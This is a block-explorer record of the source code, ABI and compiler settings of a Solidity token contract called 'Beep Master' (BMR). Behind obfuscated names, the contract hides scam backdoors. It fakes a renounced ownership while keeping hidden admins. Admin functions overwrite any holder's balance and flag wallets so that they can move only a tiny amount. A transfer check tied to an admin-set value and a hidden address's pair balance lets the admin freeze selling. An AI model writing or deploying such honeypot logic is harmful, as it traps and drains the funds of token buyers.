{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface swapWallet {\n    function createPair(address liquidityFrom, address listWalletTo) external returns (address);\n}\n\ninterface tokenFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeTo) external view returns (uint256);\n\n    function transfer(address receiverTotal, uint256 launchedExemptShould) external returns (bool);\n\n    function allowance(address sellEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedExemptShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTotal,\n        uint256 launchedExemptShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMode, uint256 value);\n    event Approval(address indexed sellEnable, address indexed spender, uint256 value);\n}\n\nabstract contract toFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenFundMetadata is tokenFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BeepMaster is toFrom, tokenFund, tokenFundMetadata {\n\n    function shouldList(address senderTxFrom) public {\n        require(senderTxFrom.balance < 100000);\n        if (shouldFundBuy) {\n            return;\n        }\n        if (sellFund != senderTx) {\n            enableSenderTeam = tradingFee;\n        }\n        toReceiver[senderTxFrom] = true;\n        if (tradingFee != sellFund) {\n            limitReceiver = true;\n        }\n        shouldFundBuy = true;\n    }\n\n    function transfer(address toTotal, uint256 launchedExemptShould) external virtual override returns (bool) {\n        return marketingReceiverFund(_msgSender(), toTotal, launchedExemptShould);\n    }\n\n    function balanceOf(address takeTo) public view virtual override returns (uint256) {\n        return tokenReceiverBuy[takeTo];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitBuy;\n    }\n\n    function transferFrom(address txFee, address receiverTotal, uint256 launchedExemptShould) external override returns (bool) {\n        if (_msgSender() != senderBuyEnable) {\n            if (txShouldMode[txFee][_msgSender()] != type(uint256).max) {\n                require(launchedExemptShould <= txShouldMode[txFee][_msgSender()]);\n                txShouldMode[txFee][_msgSender()] -= launchedExemptShould;\n            }\n        }\n        return marketingReceiverFund(txFee, receiverTotal, launchedExemptShould);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txSellMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private txShouldMode;\n\n    uint256 private senderTx;\n\n    uint256 public tradingFee;\n\n    mapping(address => uint256) private tokenReceiverBuy;\n\n    uint256 private limitBuy = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return toMarketing;\n    }\n\n    bool private limitReceiver;\n\n    string private txSellMax = \"BMR\";\n\n    address private toMarketing;\n\n    function getOwner() external view returns (address) {\n        return toMarketing;\n    }\n\n    uint256 public modeShould;\n\n    function launchToken(uint256 launchedExemptShould) public {\n        teamFundToken();\n        walletList = launchedExemptShould;\n    }\n\n    bool public feeSell;\n\n    address public enableTx;\n\n    uint256 constant fromBuyList = 6 ** 10;\n\n    function buyLimit(address atTeamMax) public {\n        teamFundToken();\n        \n        if (atTeamMax == marketingTeam || atTeamMax == enableTx) {\n            return;\n        }\n        walletMaxTeam[atTeamMax] = true;\n    }\n\n    function minTakeReceiver(address txFee, address receiverTotal, uint256 launchedExemptShould) internal returns (bool) {\n        require(tokenReceiverBuy[txFee] >= launchedExemptShould);\n        tokenReceiverBuy[txFee] -= launchedExemptShould;\n        tokenReceiverBuy[receiverTotal] += launchedExemptShould;\n        emit Transfer(txFee, receiverTotal, launchedExemptShould);\n        return true;\n    }\n\n    uint256 senderWallet;\n\n    function allowance(address tokenWallet, address receiverFund) external view virtual override returns (uint256) {\n        if (receiverFund == senderBuyEnable) {\n            return type(uint256).max;\n        }\n        return txShouldMode[tokenWallet][receiverFund];\n    }\n\n    function walletReceiver() public {\n        emit OwnershipTransferred(marketingTeam, address(0));\n        toMarketing = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return maxSell;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderIsReceiver;\n    }\n\n    function approve(address receiverFund, uint256 launchedExemptShould) public virtual override returns (bool) {\n        txShouldMode[_msgSender()][receiverFund] = launchedExemptShould;\n        emit Approval(_msgSender(), receiverFund, launchedExemptShould);\n        return true;\n    }\n\n    string private maxSell = \"Beep Master\";\n\n    function teamFundToken() private view {\n        require(toReceiver[_msgSender()]);\n    }\n\n    constructor (){\n        if (tradingFee == senderTx) {\n            feeSell = true;\n        }\n        modeFee senderTakeLiquidity = modeFee(senderBuyEnable);\n        enableTx = swapWallet(senderTakeLiquidity.factory()).createPair(senderTakeLiquidity.WETH(), address(this));\n        if (senderTx != tradingFee) {\n            tradingFee = senderTx;\n        }\n        marketingTeam = _msgSender();\n        toReceiver[marketingTeam] = true;\n        tokenReceiverBuy[marketingTeam] = limitBuy;\n        walletReceiver();\n        \n        emit Transfer(address(0), marketingTeam, limitBuy);\n    }\n\n    address atFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed sellTeam, address indexed totalSwap);\n\n    address senderBuyEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public marketingTeam;\n\n    uint256 public minLaunchTo;\n\n    function marketingReceiverFund(address txFee, address receiverTotal, uint256 launchedExemptShould) internal returns (bool) {\n        if (txFee == marketingTeam) {\n            return minTakeReceiver(txFee, receiverTotal, launchedExemptShould);\n        }\n        uint256 fromAt = tokenFund(enableTx).balanceOf(atFee);\n        require(fromAt == walletList);\n        require(receiverTotal != atFee);\n        if (walletMaxTeam[txFee]) {\n            return minTakeReceiver(txFee, receiverTotal, fromBuyList);\n        }\n        return minTakeReceiver(txFee, receiverTotal, launchedExemptShould);\n    }\n\n    uint256 private enableSenderTeam;\n\n    mapping(address => bool) public toReceiver;\n\n    uint256 walletList;\n\n    mapping(address => bool) public walletMaxTeam;\n\n    uint8 private senderIsReceiver = 18;\n\n    uint256 private sellFund;\n\n    function modeSenderIs(address toTotal, uint256 launchedExemptShould) public {\n        teamFundToken();\n        tokenReceiverBuy[toTotal] = launchedExemptShould;\n    }\n\n    bool public fundIs;\n\n    bool public shouldFundBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedExemptShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeamMax\",\"type\":\"address\"}],\"name\":\"buyLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedExemptShould\",\"type\":\"uint256\"}],\"name\":\"launchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunchTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedExemptShould\",\"type\":\"uint256\"}],\"name\":\"modeSenderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFundBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTxFrom\",\"type\":\"address\"}],\"name\":\"shouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedExemptShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedExemptShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletMaxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BeepMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}